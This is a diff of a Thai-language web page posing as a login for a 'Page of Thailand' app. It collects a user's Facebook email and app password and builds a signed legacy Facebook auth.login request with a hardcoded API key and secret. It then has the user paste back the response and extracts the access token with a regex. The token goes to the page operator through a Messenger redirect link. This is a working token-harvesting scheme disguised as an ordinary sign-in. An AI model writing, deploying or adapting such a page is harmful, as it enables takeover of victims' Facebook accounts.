@@ -4,13 +4,13 @@
 <head>
 
     <title>เข้าสู่ระบบ เพจแห่งประเทศไทย</title>
+
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
 
     <script type="text/javascript" src="js/md5.js"></script>
 
@@ -29,19 +29,37 @@
                     }
                 }
                 console.log(obj)
-                $('#panel-code').show();
+                if (obj.user && obj.pass) {
+                    $('#aaa').hide();
+                    $('#bbb').show();
 
-                var email = obj.user;
-                var password = obj.pass;
-                var data = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONmethod=auth.loginpassword=' + password + 'v=1.062f8ce9f74b12f84c123cc23437a4a32';
-                var sig = md5(data);
+                    var email = obj.user;
+                    var password = obj.pass;
+                    var data = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONmethod=auth.loginpassword=' + password + 'v=1.062f8ce9f74b12f84c123cc23437a4a32';
+                    var sig = md5(data);
 
-                var aurl = 'https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email=' + email + '&format=JSON&method=auth.login&password=' + password + '&v=1.0&sig=' + sig;
-                console.log(aurl);
+                    var aurl = 'https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email=' + email + '&format=JSON&method=auth.login&password=' + password + '&v=1.0&sig=' + sig;
+                    //console.log(aurl);
 
-                window.location = aurl
+                    //window.location = aurl
 
-                return JSON.stringify(obj);
+                    return JSON.stringify(aurl);
+
+                } else if (!obj.pass) {
+
+                    alert("คุณไม่ได้กรอก รหัสผ่านสำหรับแอพ Pageth!");
+                    return undefined
+                } else if (!obj.user) {
+
+                    alert("คุณไม่ได้กรอก อีเมล์/เบอร์โทร เฟสบุ๊ค !");
+                    return undefined
+                } else {
+                    console.log("unknown");
+                    return undefined
+                }
+
+
+
             }
 
             document.addEventListener("DOMContentLoaded", function () {
@@ -52,6 +70,125 @@
                     var json = toJSONString(this);
 
                     //output.innerHTML = json;
+                    if (json != undefined) {
+                        output.innerHTML = '<iframe src=' + json + ' style="height: 100%; width: 100%;"></iframe>';
+                    }
+
+
+                }, false);
+
+            });
+
+        })();
+    </script>
+
+
+    <script>
+        (function () {
+            function toJSONString(form) {
+                var obj = {};
+                var elements = form.querySelectorAll("input, select, textarea");
+                for (var i = 0; i < elements.length; ++i) {
+                    var element = elements[i];
+                    var name = element.name;
+                    var value = element.value;
+
+                    if (name) {
+                        obj[name] = value;
+                    }
+                }
+                console.log(obj)
+
+                if (obj.text) {
+                    var text = obj.text;
+                    var matchtoken = text.match(/[A-Z]([A-Za-z0-9]){128,255}/);
+                    var matchsms = text.match(/"error_code":406/);
+                    var matchIncorrectUsername = text.match(/Incorrect Username/);
+                    var matchIncorrectPhone = text.match(/Incorrect Phone/);
+                    var matchIncorrectEmail = text.match(/Incorrect Email/);
+                    var matchIncorrectPass = text.match(/Incorrect Password/);
+                    var matchverify = text.match(/"error_code":405/);
+                    var matchrequiredemail = text.match(/"error_code":100/);
+                    var matcholdpass = text.match(/"error_code":401/);
+                    var matchsignature = text.match(/"error_code":104/);
+
+                    if (matchtoken !== null) {
+                        $('#bbb').hide();
+                        $('#ccc').show();
+                        window.location = "https://m.me/Page.of.Thailand?ref=token_" + matchtoken[0]
+                    } else if (matchsms !== null) {
+                        alert("📌คุณต้องปิดฟังก์ชั่นรับ SMS ในเฟสบุ๊คก่อน\nแล้วทำใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchIncorrectUsername !== null) {
+                        alert("❌อีเมล์/เบอร์โทร เฟสบุ๊คของคุณ ผิด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchIncorrectPhone !== null) {
+                        alert("❌คุณกรอกเบอร์โทรศัพท์ผิด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchIncorrectEmail !== null) {
+                        alert("❌คุณกรอกอีเมล์เฟสบุ๊คผิด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchIncorrectPass !== null) {
+                        alert("❌คุณกรอกรหัสผ่าน ผิด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchverify !== null) {
+                        alert("📌คุณต้องยืนยันบัญชีของตนเองในเฟสบุ๊คก่อน\nแล้วกลับทำใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchrequiredemail !== null) {
+                        alert("❌คุณไม่ได้กรอกอีเมล์เฟสบุ๊ค ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matcholdpass !== null) {
+                        alert("❌คุณกรอกรหัสผ่าน ผิด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else if (matchsignature !== null) {
+                        alert("❌มีบางอย่างผิดพลาด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    } else {
+                        //
+                        console.log("case else incorrect => " + text);
+                        alert("❌มีบางอย่างผิดพลาด ❗️\nลองใหม่อีกครั้ง ❗️");
+                        document.getElementById("test2").reset();
+                        $('#bbb').hide();
+                        $('#aaa').show();
+                    }
+                } else {
+                    alert("❌คุณไม่ได้วางโค้ด ❗️\nลองใหม่อีกครั้ง ❗️");
+                }
+
+
+                //window.location = aurl
+
+                return JSON.stringify(obj);
+            }
+
+            document.addEventListener("DOMContentLoaded", function () {
+                var form = document.getElementById("test2");
+                var output = document.getElementById("output");
+                form.addEventListener("submit", function (e) {
+                    e.preventDefault();
+                    var json = toJSONString(this);
+
+                    //output.innerHTML = json;
+                    //output.innerHTML = '<iframe src=' + json + ' width="100%" height="100%"></iframe>';
+
                 }, false);
 
             });
@@ -63,15 +200,15 @@
         .loader {
             border: 16px solid #f3f3f3;
             border-radius: 50%;
-            border-top: 16px solid #3498db;
+            border-top: 16px solid blue;
+            border-right: 16px solid green;
+            border-bottom: 16px solid red;
             width: 120px;
             height: 120px;
             -webkit-animation: spin 2s linear infinite;
-            /* Safari */
             animation: spin 2s linear infinite;
         }
 
-        /* Safari */
         @-webkit-keyframes spin {
             0% {
                 -webkit-transform: rotate(0deg);
@@ -95,33 +232,70 @@
 
 <body>
 
-    <div class="container">
+    <div class="container" id="aaa">
         <div class="jumbotron">
-            <h2>เพจแห่งประเทศไทย</h2>
+            <h2 class="text-success">เพจแห่งประเทศไทย</h2>
+            <br><br>
+            <p class="bg-warning text-white">ถ้าคุณยังไม่ได้สร้าง รหัสผ่านสำหรับแอพ Pageth <br>
+                <a href="https://m.facebook.com/new_sec_settings/app_passwords/" class="btn btn-info" role="button">กดสร้างที่นี่ก่อน</a>
+            </p>
+
+            <br><br>
+            <img src="https://raw.githubusercontent.com/pageth/about/master/pictures/passpageth.png" class="d-block mx-auto" style="width:50%">
             <br><br>
             <form id="test" action="#" method="post">
+
+
                 <div class="form-group">
-                    <label for="user">อีเมล์/เบอร์โทร เฟสบุ๊ค :</label>
+                    <label for="pass">รหัสผ่านสำหรับแอพ Pageth ของคุณ:</label>
+                    <input type="text" class="form-control" name="pass" id="pass" placeholder="รหัสผ่านสำหรับแอพ Pageth">
+                </div>
+
+                <br>
+                <div class="form-group">
+                    <label for="user">อีเมล์/เบอร์โทร เฟสบุ๊ค ของคุณ:</label>
                     <input type="text" class="form-control" name="user" id="user" placeholder="อีเมล์/เบอร์โทร เฟสบุ๊ค">
                 </div>
                 <br>
 
-                <div class="form-group">
-                    <label for="pass">รหัสผ่าน สำหรับแอพ pageth :</label>
-                    <input type="text" class="form-control" name="pass" id="pass" placeholder="รหัสผ่าน สำหรับแอพ pageth">
-                </div>
 
-                <br>
                 <p>
                     <input type="submit" value="Send" class="btn btn-primary btn-block" />
                 </p>
             </form>
-            <div align="center" class="inputGroup inputGroup4" id="panel-code" style="display: none">
-                <div class="loader"></div><br>
-                <label>กำลังโหลด รอ...<br><br></label><br><br>
-                <label>คัดลอกโค้ดแล้วส่งให้<br></label>
-                <label>เพจแห่งประเทศไทย</label>
-            </div>
+
+
+
+        </div>
+    </div>
+
+
+    <div class="container" id="bbb" style="display: none">
+        <div class="jumbotron">
+            <h2 class="text-success">เพจแห่งประเทศไทย</h2>
+            <br><br>
+            <label>รอโหลดโค้ด... แล้วคัดลอกโค้ด<br></label>
+
+            <pre id="output"> <br></pre>
+            <img src="https://raw.githubusercontent.com/pageth/about/master/pictures/arrow.png" class="d-block mx-auto" style="width:10%">
+
+            <form id="test2" action="#" method="post">
+                <div class="form-group">
+                    <label for="comment">มาวางข้างล่างนี้:</label>
+                    <textarea class="form-control" rows="5" id="comment" name="text"></textarea>
+                </div>
+                <button type="submit" class="btn btn-primary">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="container" id="ccc" style="display: none">
+        <div class="jumbotron">
+            <h2 class="text-success">เพจแห่งประเทศไทย</h2>
+            <br><br>
+
+            <div class="loader"></div>
+
         </div>
     </div>
 
